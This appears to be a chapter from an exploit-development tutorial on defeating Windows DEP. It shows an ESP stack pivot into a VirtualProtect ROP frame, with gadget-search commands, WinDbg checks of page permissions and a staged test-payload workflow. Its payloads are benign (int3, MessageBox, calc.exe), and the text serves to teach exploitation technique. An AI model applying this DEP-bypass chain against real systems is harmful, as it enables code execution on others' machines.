## 10. Firing the call and the "don't debug two problems" discipline

### P8 — Pivot ESP onto the fake frame and fire

**Problem.** Execution must "return into" `&VP` with ESP pointing at the frame.
There is rarely a clean `add esp, N`. The usual pivot:

```
findstr /C:": xchg eax, ebp ; ret" rop.txt          → G_XCHG_EAX_EBP
findstr /C:": mov esp, ebp ; pop ebp ; ret" rop.txt  → G_MOV_ESP_EBP
```

Get the address of `&VP`'s slot into EAX (ESI-arithmetic again), then:

```
G_XCHG_EAX_EBP     ; ebp = &frame
G_MOV_ESP_EBP      ; esp = ebp, then pop ebp (eats one dword!) then ret → into &VP
```

**The pivot gotcha.** `mov esp,ebp ; pop ebp ; ret` pops one dword after setting
ESP. So aim EBP **4 bytes before** `&VP`'s slot, so the stray `pop ebp` consumes a
throwaway dword and ESP lands exactly on `&VP`. The final `ret` then enters
VirtualProtect; VP's own `ret 0x10` (stdcall, 4 args × 4 = 0x10) returns into the
dword we stored as the return address — our shellcode page.

> **Verify — watch DEP fall.**
> ```
> 0:000> dds esp L1
> 0133e5xx   (this is the shellcode page we set as lpAddress)
> 0:000> !vprot 0133e5xx
>     Protect: 00000004  PAGE_READWRITE          ← before VP
> 0:000> pt                                       ← step over VirtualProtect
> 0:000> !vprot 0133e5xx
>     Protect: 00000040  PAGE_EXECUTE_READWRITE   ← DEP defeated for this page
> ```

### 10.1 Chapter title: Don't Debug Two Problems at Once

Before you put a single byte of real shellcode in, prove the *ROP* works by
landing on a breakpoint. Stage the payload:

```
Stage 1:  payload = "\xCC" * N          (int3)   → prove control reached RWX memory
Stage 2:  payload = MessageBox shellcode         → prove arbitrary code executes
Stage 3:  payload = launch calc.exe              → a complete, benign exploit
Stage 4:  payload = anything you choose (fits space + bad chars)
```

Workflow:

```
1. Confirm the ROP chain completes (no fault through P8).
2. Confirm page permissions changed (!vprot before/after → RWX).
3. Confirm execution reaches the payload — a debugger break on the FIRST 0xCC.
4. ONLY THEN substitute real shellcode.
```

If your `int3` fires, the DEP bypass is *done*. Any later failure is a
shellcode/space/bad-char problem, not a ROP problem. This separation is the
single biggest time-saver in exploit development: you are never simultaneously
unsure whether the bug is in your chain or your payload.

> **Verify.** With `payload = b"\xCC" * 16`, after P8 you should hit:
> `(xxxx.xxxx): Break instruction exception - code 80000003` at your shellcode
> address. Registers show `eip` inside the (now RWX) stack page. That is a
> proven DEP bypass.

---

---

[← Previous](09-building-the-chain.md) · [Index](00-index.md) · [Next →](11-landing-shellcode.md)
